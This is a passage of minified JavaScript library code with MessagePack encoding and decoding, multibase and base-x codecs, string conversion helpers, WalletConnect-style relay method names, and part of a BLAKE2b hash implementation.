n=e.length;this.ensureBufferSizeToWrite(n),this.bytes.set(e,this.pos),this.pos+=n}writeI8(e){this.ensureBufferSizeToWrite(1),this.view.setInt8(this.pos,e),this.pos++}writeU16(e){this.ensureBufferSizeToWrite(2),this.view.setUint16(this.pos,e),this.pos+=2}writeI16(e){this.ensureBufferSizeToWrite(2),this.view.setInt16(this.pos,e),this.pos+=2}writeU32(e){this.ensureBufferSizeToWrite(4),this.view.setUint32(this.pos,e),this.pos+=4}writeI32(e){this.ensureBufferSizeToWrite(4),this.view.setInt32(this.pos,e),this.pos+=4}writeF32(e){this.ensureBufferSizeToWrite(4),this.view.setFloat32(this.pos,e),this.pos+=4}writeF64(e){this.ensureBufferSizeToWrite(8),this.view.setFloat64(this.pos,e),this.pos+=8}writeU64(e){this.ensureBufferSizeToWrite(8),cE(this.view,this.pos,e),this.pos+=8}writeI64(e){this.ensureBufferSizeToWrite(8),lp(this.view,this.pos,e),this.pos+=8}writeBigUint64(e){this.ensureBufferSizeToWrite(8),this.view.setBigUint64(this.pos,e),this.pos+=8}writeBigInt64(e){this.ensureBufferSizeToWrite(8),this.view.setBigInt64(this.pos,e),this.pos+=8}};function _E(t,e){return new xE(e).encodeSharedRef(t)}function qo(t){return`${t<0?"-":""}0x${Math.abs(t).toString(16).padStart(2,"0")}`}const IE=16,SE=16;class DE{constructor(e=IE,n=SE){this.hit=0,this.miss=0,this.maxKeyLength=e,this.maxLengthPerKey=n,this.caches=[];for(let r=0;r<this.maxKeyLength;r++)this.caches.push([])}canBeCached(e){return e>0&&e<=this.maxKeyLength}find(e,n,r){const i=this.caches[r-1];e:for(const s of i){const o=s.bytes;for(let a=0;a<r;a++)if(o[a]!==e[n+a])continue e;return s.str}return null}store(e,n){const r=this.caches[e.length-1],i={bytes:e,str:n};r.length>=this.maxLengthPerKey?r[Math.random()*r.length|0]=i:r.push(i)}decode(e,n,r){const i=this.find(e,n,r);if(i!=null)return this.hit++,i;this.miss++;const s=cp(e,n,r),o=Uint8Array.prototype.slice.call(e,n,n+r);return this.store(o,s),s}}const Na="array",di="map_key",fp="map_value",AE=t=>{if(typeof t=="string"||typeof t=="number")return t;throw new ut("The type of key must be string or number but "+typeof t)};class OE{constructor(){this.stack=[],this.stackHeadPosition=-1}get length(){return this.stackHeadPosition+1}top(){return this.stack[this.stackHeadPosition]}pushArrayState(e){const n=this.getUninitializedStateFromPool();n.type=Na,n.position=0,n.size=e,n.array=new Array(e)}pushMapState(e){const n=this.getUninitializedStateFromPool();n.type=di,n.readCount=0,n.size=e,n.map={}}getUninitializedStateFromPool(){if(this.stackHeadPosition++,this.stackHeadPosition===this.stack.length){const e={type:void 0,size:0,array:void 0,position:0,readCount:0,map:void 0,key:null};this.stack.push(e)}return this.stack[this.stackHeadPosition]}release(e){if(this.stack[this.stackHeadPosition]!==e)throw new Error("Invalid stack state. Released state is not on top of the stack.");if(e.type===Na){const r=e;r.size=0,r.array=void 0,r.position=0,r.type=void 0}if(e.type===di||e.type===fp){const r=e;r.size=0,r.map=void 0,r.readCount=0,r.type=void 0}this.stackHeadPosition--}reset(){this.stack.length=0,this.stackHeadPosition=-1}}const Jr=-1,Lc=new DataView(new ArrayBuffer(0)),$E=new Uint8Array(Lc.buffer);try{Lc.getInt8(0)}catch(t){if(!(t instanceof RangeError))throw new Error("This module is not supported in the current JavaScript engine because DataView does not throw RangeError on out-of-bounds access")}const Uu=new RangeError("Insufficient data"),CE=new DE;let PE=class dp{constructor(e){this.totalPos=0,this.pos=0,this.view=Lc,this.bytes=$E,this.headByte=Jr,this.stack=new OE,this.entered=!1,this.extensionCodec=e?.extensionCodec??Cs.defaultCodec,this.context=e?.context,this.useBigInt64=e?.useBigInt64??!1,this.rawStrings=e?.rawStrings??!1,this.maxStrLength=e?.maxStrLength??Xr,this.maxBinLength=e?.maxBinLength??Xr,this.maxArrayLength=e?.maxArrayLength??Xr,this.maxMapLength=e?.maxMapLength??Xr,this.maxExtLength=e?.maxExtLength??Xr,this.keyDecoder=e?.keyDecoder!==void 0?e.keyDecoder:CE,this.mapKeyConverter=e?.mapKeyConverter??AE}clone(){return new dp({extensionCodec:this.extensionCodec,context:this.context,useBigInt64:this.useBigInt64,rawStrings:this.rawStrings,maxStrLength:this.maxStrLength,maxBinLength:this.maxBinLength,maxArrayLength:this.maxArrayLength,maxMapLength:this.maxMapLength,maxExtLength:this.maxExtLength,keyDecoder:this.keyDecoder})}reinitializeState(){this.totalPos=0,this.headByte=Jr,this.stack.reset()}setBuffer(e){const n=ka(e);this.bytes=n,this.view=new DataView(n.buffer,n.byteOffset,n.byteLength),this.pos=0}appendBuffer(e){if(this.headByte===Jr&&!this.hasRemaining(1))this.setBuffer(e);else{const n=this.bytes.subarray(this.pos),r=ka(e),i=new Uint8Array(n.length+r.length);i.set(n),i.set(r,n.length),this.setBuffer(i)}}hasRemaining(e){return this.view.byteLength-this.pos>=e}createExtraByteError(e){const{view:n,pos:r}=this;return new RangeError(`Extra ${n.byteLength-r} of ${n.byteLength} byte(s) found at buffer[${e}]`)}decode(e){if(this.entered)return this.clone().decode(e);try{this.entered=!0,this.reinitializeState(),this.setBuffer(e);const n=this.doDecodeSync();if(this.hasRemaining(1))throw this.createExtraByteError(this.pos);return n}finally{this.entered=!1}}*decodeMulti(e){if(this.entered){yield*this.clone().decodeMulti(e);return}try{for(this.entered=!0,this.reinitializeState(),this.setBuffer(e);this.hasRemaining(1);)yield this.doDecodeSync()}finally{this.entered=!1}}async decodeAsync(e){if(this.entered)return this.clone().decodeAsync(e);try{this.entered=!0;let n=!1,r;for await(const a of e){if(n)throw this.entered=!1,this.createExtraByteError(this.totalPos);this.appendBuffer(a);try{r=this.doDecodeSync(),n=!0}catch(c){if(!(c instanceof RangeError))throw c}this.totalPos+=this.pos}if(n){if(this.hasRemaining(1))throw this.createExtraByteError(this.totalPos);return r}const{headByte:i,pos:s,totalPos:o}=this;throw new RangeError(`Insufficient data in parsing ${qo(i)} at ${o} (${s} in the current buffer)`)}finally{this.entered=!1}}decodeArrayStream(e){return this.decodeMultiAsync(e,!0)}decodeStream(e){return this.decodeMultiAsync(e,!1)}async*decodeMultiAsync(e,n){if(this.entered){yield*this.clone().decodeMultiAsync(e,n);return}try{this.entered=!0;let r=n,i=-1;for await(const s of e){if(n&&i===0)throw this.createExtraByteError(this.totalPos);this.appendBuffer(s),r&&(i=this.readArraySize(),r=!1,this.complete());try{for(;yield this.doDecodeSync(),--i!==0;);}catch(o){if(!(o instanceof RangeError))throw o}this.totalPos+=this.pos}}finally{this.entered=!1}}doDecodeSync(){e:for(;;){const e=this.readHeadByte();let n;if(e>=224)n=e-256;else if(e<192)if(e<128)n=e;else if(e<144){const i=e-128;if(i!==0){this.pushMapState(i),this.complete();continue e}else n={}}else if(e<160){const i=e-144;if(i!==0){this.pushArrayState(i),this.complete();continue e}else n=[]}else{const i=e-160;n=this.decodeString(i,0)}else if(e===192)n=null;else if(e===194)n=!1;else if(e===195)n=!0;else if(e===202)n=this.readF32();else if(e===203)n=this.readF64();else if(e===204)n=this.readU8();else if(e===205)n=this.readU16();else if(e===206)n=this.readU32();else if(e===207)this.useBigInt64?n=this.readU64AsBigInt():n=this.readU64();else if(e===208)n=this.readI8();else if(e===209)n=this.readI16();else if(e===210)n=this.readI32();else if(e===211)this.useBigInt64?n=this.readI64AsBigInt():n=this.readI64();else if(e===217){const i=this.lookU8();n=this.decodeString(i,1)}else if(e===218){const i=this.lookU16();n=this.decodeString(i,2)}else if(e===219){const i=this.lookU32();n=this.decodeString(i,4)}else if(e===220){const i=this.readU16();if(i!==0){this.pushArrayState(i),this.complete();continue e}else n=[]}else if(e===221){const i=this.readU32();if(i!==0){this.pushArrayState(i),this.complete();continue e}else n=[]}else if(e===222){const i=this.readU16();if(i!==0){this.pushMapState(i),this.complete();continue e}else n={}}else if(e===223){const i=this.readU32();if(i!==0){this.pushMapState(i),this.complete();continue e}else n={}}else if(e===196){const i=this.lookU8();n=this.decodeBinary(i,1)}else if(e===197){const i=this.lookU16();n=this.decodeBinary(i,2)}else if(e===198){const i=this.lookU32();n=this.decodeBinary(i,4)}else if(e===212)n=this.decodeExtension(1,0);else if(e===213)n=this.decodeExtension(2,0);else if(e===214)n=this.decodeExtension(4,0);else if(e===215)n=this.decodeExtension(8,0);else if(e===216)n=this.decodeExtension(16,0);else if(e===199){const i=this.lookU8();n=this.decodeExtension(i,1)}else if(e===200){const i=this.lookU16();n=this.decodeExtension(i,2)}else if(e===201){const i=this.lookU32();n=this.decodeExtension(i,4)}else throw new ut(`Unrecognized type byte: ${qo(e)}`);this.complete();const r=this.stack;for(;r.length>0;){const i=r.top();if(i.type===Na)if(i.array[i.position]=n,i.position++,i.position===i.size)n=i.array,r.release(i);else continue e;else if(i.type===di){if(n==="__proto__")throw new ut("The key __proto__ is not allowed");i.key=this.mapKeyConverter(n),i.type=fp;continue e}else if(i.map[i.key]=n,i.readCount++,i.readCount===i.size)n=i.map,r.release(i);else{i.key=null,i.type=di;continue e}}return n}}readHeadByte(){return this.headByte===Jr&&(this.headByte=this.readU8()),this.headByte}complete(){this.headByte=Jr}readArraySize(){const e=this.readHeadByte();switch(e){case 220:return this.readU16();case 221:return this.readU32();default:{if(e<160)return e-144;throw new ut(`Unrecognized array type byte: ${qo(e)}`)}}}pushMapState(e){if(e>this.maxMapLength)throw new ut(`Max length exceeded: map length (${e}) > maxMapLengthLength (${this.maxMapLength})`);this.stack.pushMapState(e)}pushArrayState(e){if(e>this.maxArrayLength)throw new ut(`Max length exceeded: array length (${e}) > maxArrayLength (${this.maxArrayLength})`);this.stack.pushArrayState(e)}decodeString(e,n){return!this.rawStrings||this.stateIsMapKey()?this.decodeUtf8String(e,n):this.decodeBinary(e,n)}decodeUtf8String(e,n){if(e>this.maxStrLength)throw new ut(`Max length exceeded: UTF-8 byte length (${e}) > maxStrLength (${this.maxStrLength})`);if(this.bytes.byteLength<this.pos+n+e)throw Uu;const r=this.pos+n;let i;return this.stateIsMapKey()&&this.keyDecoder?.canBeCached(e)?i=this.keyDecoder.decode(this.bytes,r,e):i=aE(this.bytes,r,e),this.pos+=n+e,i}stateIsMapKey(){return this.stack.length>0?this.stack.top().type===di:!1}decodeBinary(e,n){if(e>this.maxBinLength)throw new ut(`Max length exceeded: bin length (${e}) > maxBinLength (${this.maxBinLength})`);if(!this.hasRemaining(e+n))throw Uu;const r=this.pos+n,i=this.bytes.subarray(r,r+e);return this.pos+=n+e,i}decodeExtension(e,n){if(e>this.maxExtLength)throw new ut(`Max length exceeded: ext length (${e}) > maxExtLength (${this.maxExtLength})`);const r=this.view.getInt8(this.pos+n),i=this.decodeBinary(e,n+1);return this.extensionCodec.decode(i,r,this.context)}lookU8(){return this.view.getUint8(this.pos)}lookU16(){return this.view.getUint16(this.pos)}lookU32(){return this.view.getUint32(this.pos)}readU8(){const e=this.view.getUint8(this.pos);return this.pos++,e}readI8(){const e=this.view.getInt8(this.pos);return this.pos++,e}readU16(){const e=this.view.getUint16(this.pos);return this.pos+=2,e}readI16(){const e=this.view.getInt16(this.pos);return this.pos+=2,e}readU32(){const e=this.view.getUint32(this.pos);return this.pos+=4,e}readI32(){const e=this.view.getInt32(this.pos);return this.pos+=4,e}readU64(){const e=lE(this.view,this.pos);return this.pos+=8,e}readI64(){const e=up(this.view,this.pos);return this.pos+=8,e}readU64AsBigInt(){const e=this.view.getBigUint64(this.pos);return this.pos+=8,e}readI64AsBigInt(){const e=this.view.getBigInt64(this.pos);return this.pos+=8,e}readF32(){const e=this.view.getFloat32(this.pos);return this.pos+=4,e}readF64(){const e=this.view.getFloat64(this.pos);return this.pos+=8,e}};function TE(t,e){return new PE(e).decode(t)}function Fc(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function pp(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?Fc(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function pi(t,e){e||(e=t.reduce((i,s)=>i+s.length,0));const n=pp(e);let r=0;for(const i of t)n.set(i,r),r+=i.length;return Fc(n)}function BE(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(n[o]!==255)throw new TypeError(s+" is ambiguous");n[o]=i}var a=t.length,c=t.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function h(d){if(d instanceof Uint8Array||(ArrayBuffer.isView(d)?d=new Uint8Array(d.buffer,d.byteOffset,d.byteLength):Array.isArray(d)&&(d=Uint8Array.from(d))),!(d instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(d.length===0)return"";for(var g=0,w=0,_=0,C=d.length;_!==C&&d[_]===0;)_++,g++;for(var v=(C-_)*u+1>>>0,b=new Uint8Array(v);_!==C;){for(var x=d[_],O=0,B=v-1;(x!==0||O<w)&&B!==-1;B--,O++)x+=256*b[B]>>>0,b[B]=x%a>>>0,x=x/a>>>0;if(x!==0)throw new Error("Non-zero carry");w=O,_++}for(var k=v-w;k!==v&&b[k]===0;)k++;for(var $=c.repeat(g);k<v;++k)$+=t.charAt(b[k]);return $}function f(d){if(typeof d!="string")throw new TypeError("Expected String");if(d.length===0)return new Uint8Array;var g=0;if(d[g]!==" "){for(var w=0,_=0;d[g]===c;)w++,g++;for(var C=(d.length-g)*l+1>>>0,v=new Uint8Array(C);d[g];){var b=n[d.charCodeAt(g)];if(b===255)return;for(var x=0,O=C-1;(b!==0||x<_)&&O!==-1;O--,x++)b+=a*v[O]>>>0,v[O]=b%256>>>0,b=b/256>>>0;if(b!==0)throw new Error("Non-zero carry");_=x,g++}if(d[g]!==" "){for(var B=C-_;B!==C&&v[B]===0;)B++;for(var k=new Uint8Array(w+(C-B)),$=w;B!==C;)k[$++]=v[B++];return k}}}function p(d){var g=f(d);if(g)return g;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:f,decode:p}}var RE=BE,kE=RE;const NE=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},UE=t=>new TextEncoder().encode(t),ME=t=>new TextDecoder().decode(t);class LE{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class FE{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return gp(this,e)}}class jE{constructor(e){this.decoders=e}or(e){return gp(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const gp=(t,e)=>new jE({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class qE{constructor(e,n,r,i){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=i,this.encoder=new LE(e,n,r),this.decoder=new FE(e,n,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const Zs=({name:t,prefix:e,encode:n,decode:r})=>new qE(t,e,n,r),ki=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:i}=kE(n,e);return Zs({prefix:t,name:e,encode:r,decode:s=>NE(i(s))})},zE=(t,e,n,r)=>{const i={};for(let u=0;u<e.length;++u)i[e[u]]=u;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*n/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const h=i[t[u]];if(h===void 0)throw new SyntaxError(`Non-${r} character`);c=c<<n|h,a+=n,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=n||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},VE=(t,e,n)=>{const r=e[e.length-1]==="=",i=(1<<n)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>n;)o-=n,s+=e[i&a>>o];if(o&&(s+=e[i&a<<n-o]),r)for(;s.length*n&7;)s+="=";return s},Ue=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>Zs({prefix:e,name:t,encode(i){return VE(i,r,n)},decode(i){return zE(i,r,n,t)}}),WE=Zs({prefix:"\0",name:"identity",encode:t=>ME(t),decode:t=>UE(t)}),KE=Object.freeze(Object.defineProperty({__proto__:null,identity:WE},Symbol.toStringTag,{value:"Module"})),HE=Ue({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1}),GE=Object.freeze(Object.defineProperty({__proto__:null,base2:HE},Symbol.toStringTag,{value:"Module"})),YE=Ue({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3}),ZE=Object.freeze(Object.defineProperty({__proto__:null,base8:YE},Symbol.toStringTag,{value:"Module"})),XE=ki({prefix:"9",name:"base10",alphabet:"0123456789"}),JE=Object.freeze(Object.defineProperty({__proto__:null,base10:XE},Symbol.toStringTag,{value:"Module"})),QE=Ue({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),ex=Ue({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4}),tx=Object.freeze(Object.defineProperty({__proto__:null,base16:QE,base16upper:ex},Symbol.toStringTag,{value:"Module"})),nx=Ue({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),rx=Ue({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),ix=Ue({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),sx=Ue({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),ox=Ue({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),ax=Ue({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),cx=Ue({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),lx=Ue({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),ux=Ue({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5}),hx=Object.freeze(Object.defineProperty({__proto__:null,base32:nx,base32hex:ox,base32hexpad:cx,base32hexpadupper:lx,base32hexupper:ax,base32pad:ix,base32padupper:sx,base32upper:rx,base32z:ux},Symbol.toStringTag,{value:"Module"})),fx=ki({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),dx=ki({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"}),px=Object.freeze(Object.defineProperty({__proto__:null,base36:fx,base36upper:dx},Symbol.toStringTag,{value:"Module"})),gx=ki({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),yx=ki({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"}),mx=Object.freeze(Object.defineProperty({__proto__:null,base58btc:gx,base58flickr:yx},Symbol.toStringTag,{value:"Module"})),wx=Ue({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),bx=Ue({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),vx=Ue({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),Ex=Ue({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6}),xx=Object.freeze(Object.defineProperty({__proto__:null,base64:wx,base64pad:bx,base64url:vx,base64urlpad:Ex},Symbol.toStringTag,{value:"Module"})),yp=Array.from(""),_x=yp.reduce((t,e,n)=>(t[n]=e,t),[]),Ix=yp.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);function Sx(t){return t.reduce((e,n)=>(e+=_x[n],e),"")}function Dx(t){const e=[];for(const n of t){const r=Ix[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const Ax=Zs({prefix:"",name:"base256emoji",encode:Sx,decode:Dx}),Ox=Object.freeze(Object.defineProperty({__proto__:null,base256emoji:Ax},Symbol.toStringTag,{value:"Module"}));new TextEncoder;new TextDecoder;const Mu={...KE,...GE,...ZE,...JE,...tx,...hx,...px,...mx,...xx,...Ox};function mp(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const Lu=mp("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),zo=mp("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=pp(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),wp={utf8:Lu,"utf-8":Lu,hex:Mu.base16,latin1:zo,ascii:zo,binary:zo,...Mu};function xt(t,e="utf8"){const n=wp[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?Fc(globalThis.Buffer.from(t,"utf-8")):n.decoder.decode(`${n.prefix}${t}`)}function st(t,e="utf8"){const n=wp[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):n.encoder.encode(t).substring(1)}const $x={waku:{publish:"waku_publish",batchPublish:"waku_batchPublish",subscribe:"waku_subscribe",batchSubscribe:"waku_batchSubscribe",subscription:"waku_subscription",unsubscribe:"waku_unsubscribe",batchUnsubscribe:"waku_batchUnsubscribe",batchFetchMessages:"waku_batchFetchMessages"},irn:{publish:"irn_publish",batchPublish:"irn_batchPublish",subscribe:"irn_subscribe",batchSubscribe:"irn_batchSubscribe",subscription:"irn_subscription",unsubscribe:"irn_unsubscribe",batchUnsubscribe:"irn_batchUnsubscribe",batchFetchMessages:"irn_batchFetchMessages"},iridium:{publish:"iridium_publish",batchPublish:"iridium_batchPublish",subscribe:"iridium_subscribe",batchSubscribe:"iridium_batchSubscribe",subscription:"iridium_subscription",unsubscribe:"iridium_unsubscribe",batchUnsubscribe:"iridium_batchUnsubscribe",batchFetchMessages:"iridium_batchFetchMessages"}};var Vo,Fu;function bp(){if(Fu)return Vo;Fu=1;const t="Input must be an string, Buffer or Uint8Array";function e(o){let a;if(o instanceof Uint8Array)a=o;else if(typeof o=="string")a=new TextEncoder().encode(o);else throw new Error(t);return a}function n(o){return Array.prototype.map.call(o,function(a){return(a<16?"0":"")+a.toString(16)}).join("")}function r(o){return(4294967296+o).toString(16).substring(1)}function i(o,a,c){let l=`
`+o+" = ";for(let u=0;u<a.length;u+=2){if(c===32)l+=r(a[u]).toUpperCase(),l+=" ",l+=r(a[u+1]).toUpperCase();else if(c===64)l+=r(a[u+1]).toUpperCase(),l+=r(a[u]).toUpperCase();else throw new Error("Invalid size "+c);u%6===4?l+=`
`+new Array(o.length+4).join(" "):u<a.length-2&&(l+=" ")}console.log(l)}function s(o,a,c){let l=new Date().getTime();const u=new Uint8Array(a);for(let f=0;f<a;f++)u[f]=f%256;const h=new Date().getTime();console.log("Generated random input in "+(h-l)+"ms"),l=h;for(let f=0;f<c;f++){const p=o(u),d=new Date().getTime(),g=d-l;l=d,console.log("Hashed in "+g+"ms: "+p.substring(0,20)+"..."),console.log(Math.round(a/(1<<20)/(g/1e3)*100)/100+" MB PER SECOND")}}return Vo={normalizeInput:e,toHex:n,debugPrint:i,testSpeed:s},Vo}var Wo,ju;function Cx(){if(ju)return Wo;ju=1;const t=bp();function e(_,C,v){const b=_[C]+_[v];let x=_[C+1]+_[v+1];b>=4294967296&&x++,_[C]=b,_[C+1]=x}function n(_,C,v,b){let x=_[C]+v;v<0&&(x+=4294967296);let O=_[C+1]+b;x>=4294967296&&O++,_[C]=x,_[C+1]=O}function r(_,C){return _[C]^_[C+1]<<8^_[C+2]<<16^_[C+3]<<24}function i(_,C,v,b,x,O){const B=l[x],k=l[x+1],$=l[O],N=l[O+1];e(c,_,C),n(c,_,B,k);let E=c[b]^c[_],S=c[b+1]^c[_+1];c[b]=S,c[b+1]=E,e(c,v,b),E=c[C]^c[v],S=c[C+1]^c[v+1],c[C]=E>>>24^S<<8,c[C+1]=S>>>24^E<<8,e(c,_,C),n(c,_,$,N),E=c[b]^c[_],S=c[b+1]^c[_+1],c[b]=E>>>16^S<<16,c[b+1]=S>>>16^E<<16,e(c,v,b),E=c[C]^c[v],S=c[C+1]^c[v+1],c[C]=S>>>31^E<<1,c[C+1]=E>>>31^S<<1}const s=new Uint32Array([4089235720,1779033703,2227873595,3144134277,4271175723,1013904242,1595750129,2773480762,2917565137,1359893119,725511199,2600822924,4215389547,528734635,327033209,1541459225]),o=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3],a=new Uint8Array(o.map(function(_){return _*2})),c=new Uint32Array(32),l=new Uint32Array(32);function u(_,C){let v=0;for(v=0;v<16;v++)c[v]=_.h[v],c[v+16]=s[v];for(c[24]=c[24]^_.t,c[25]=c[25]^_.t/4294967296,C&&(c[28]=~c[28],c[29]=~c[29]),v=0;v<32;v++)l[v]=r(_.b,4*v);for(v=0;v<12;v++)i(0,8,16,24,a[v*16+0],a[v*16+1]),i(2,10,18,26,a[v*16+2],a[v*16+3]),i(4,12,20,28,a[v*16+4],a[v*16+5]),i(6,14,22,30,a[v*16+6],a[v*16+7]),i(0,10,20,30,a[v*16+8],a[v*16+9]),i(2,12,22,24,a[v*16+10],a[v*16+11]),i(4,14,16,26,a[v*16+12],a[v*16+13]),i(6,8,18,28,a[v*16+14],a[v*16+15]);for(v=0;v<16;v++)_.h[v]=_.h[v]^c[v]^c[v+16]}const h=new Uint8Array([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]);function f(_,C,v,b){if(_===0||_>64)throw new Error("Illegal output length, expected 0 < length <= 64");if(C&&C.length>64)throw new Error("Illegal key, expected Uint8Array with 0 < length <= 64");if(v&&v.length!==16)throw new Error("Illegal salt, expected Uint8Array with length is 16");if(b&&b.length!==16)throw new Error("Illegal personal, expected Uint8Array with length is 16");const x={b:new Uint8Array(128),h:new Uint32Array(16),t:0,c:0,outlen:_};h.fill(0),h[0]=_,C&&(h[1]=C.length),h[2]=1,h[3]=1,v&&h.set(v,32),b&&h.set(b,48);for(let O=0;O<16;O++)x.h[O]=s[O]^r(h,O*4);return C&&(p(x,C),x.c=128),x}function p(_,C){for(let v=0;v<C.length;v++)_.c===128&&(_.t+=_.c,u(_,!1),_.c=0),_.b[_.c++]=C[v]}function d(_){for(_.t+=_.c;_.c<128;)_.b[_.c++]=0;u(_,!0);const C=new Uint8Array(_.outlen);for(let v=0;v<_.outlen;v++)C[v]=_.h[v>>2]>>8*(v&3);return C}function g(_,C,v,b,x){v=v||64,_=t.normalizeInput(_),b&&(b=t.normalizeInput(b)),x&&(x=t.normalizeInput(x));const O=f(v,C,b,x);return p(O,_),d(O)}function w(_,C,v,b,x){const O=g(_,C,v,b,x);return t.toHex(O)}return Wo={blake2b:g,blake2bHex:w,blake2bInit:f,blake2bUpdate:p,blake2bFinal:d},Wo}var Ko,qu;function Px(){if(qu)return Ko;qu=1;const t=bp();function e(d,g){return d[g]^d[g+1]<<8^d[g+2]<<16^d[g+3]<<24}function 